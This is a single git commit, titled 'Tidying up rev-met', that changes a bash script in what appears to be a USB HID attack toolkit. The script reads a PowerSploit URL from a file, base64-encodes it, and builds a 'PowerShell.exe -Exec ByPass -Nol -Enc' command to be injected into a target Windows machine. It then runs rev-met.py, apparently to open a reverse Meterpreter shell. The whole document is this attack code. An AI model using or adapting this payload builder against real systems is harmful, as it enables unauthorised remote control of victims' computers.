28042c1886408ccb3e1d5560720e1746ea5469be
muts <muts@pro.local>
2014-09-09 02:34:04 +0300

    Tidying up rev-met

--- utils/hid/rev-met.sh
+++ utils/hid/rev-met.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-encode="`cat /sdcard/files/url | /usr/bin/iconv --to-code UTF-16LE | /usr/bin/base64 -w 0`"
+encode="`cat /sdcard/files/powersploit-url | /usr/bin/iconv --to-code UTF-16LE | /usr/bin/base64 -w 0`"
 command=" PowerShell.exe -Exec ByPass -Nol -Enc $encode"
 echo " $command" >/sdcard/files/rev-met
 /usr/bin/rev-met.py
